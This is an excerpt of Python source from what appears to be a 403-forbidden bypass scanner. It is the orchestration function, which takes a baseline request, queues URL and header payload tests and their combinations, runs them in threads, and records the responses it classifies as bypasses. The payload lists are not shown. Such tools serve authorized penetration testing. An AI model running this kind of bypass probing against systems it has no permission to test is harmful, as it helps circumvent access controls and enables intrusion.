# Per-target orchestration
# ──────────────────────────────────────────────────────────────────────────
def scan_target(target_url: str, url_payloads: list, header_pairs: list,
                 args, stats: Stats, output_path: str, ua_index: int):
    target_url = normalize_url(target_url)
    session = create_session(ua_index=ua_index)

    console.print(Panel(f"[bold white]{target_url}[/bold white]", title="Target", style="cyan"))

    baseline = baseline_request(session, target_url, args.timeout, not args.no_verify, args.delay)
    if baseline is None:
        log(f"[red][-] Skipping target — baseline failed: {target_url}[/red]")
        return

    if baseline.status_code != ORIGINAL_STATUS:
        log(
            f"[yellow][!] Note: baseline status is {baseline.status_code}, not 403. "
            f"Bypass detection will still run, but this target may not be 403-protected.[/yellow]"
        )

    findings = []
    jobs = []

    # Build job list: URL-only, header-only, and combination (if enabled)
    if not args.no_url:
        for payload in url_payloads:
            jobs.append(("url", payload, None, None))
    if not args.no_headers:
        for h_name, h_val in header_pairs:
            jobs.append(("header", None, h_name, h_val))
    if args.combine:
        for payload in url_payloads:
            for h_name, h_val in header_pairs:
                jobs.append(("combo", payload, h_name, h_val))

    def run_job(job):
        kind, payload, h_name, h_val = job
        if kind == "url":
            return test_url_payload(session, target_url, payload, baseline,
                                      args.timeout, not args.no_verify, args.delay, stats)
        elif kind == "header":
            return test_header_payload(session, target_url, h_name, h_val, baseline,
                                         args.timeout, not args.no_verify, args.delay, stats)
        else:
            return test_combination(session, target_url, payload, h_name, h_val,
                                      baseline, args.timeout, not args.no_verify,
                                      args.delay, stats)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(run_job, job) for job in jobs]
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures),
                            desc=f"Testing {urlparse(target_url).netloc}", unit="req",
                            colour="green", leave=False):
            result = future.result()
            if result.classification in ("BYPASS", "WAF_BLOCK"):
                print_result_line(result)
            if result.classification == "BYPASS":
                findings.append(result)
                save_result(result, output_path)

    if findings:
        log(f"[bold green][+] {len(findings)} bypass(es) confirmed for {target_url}[/bold green]")
    else:
        log(f"[white][-] No confirmed bypasses for {target_url}[/white]")
    return findings


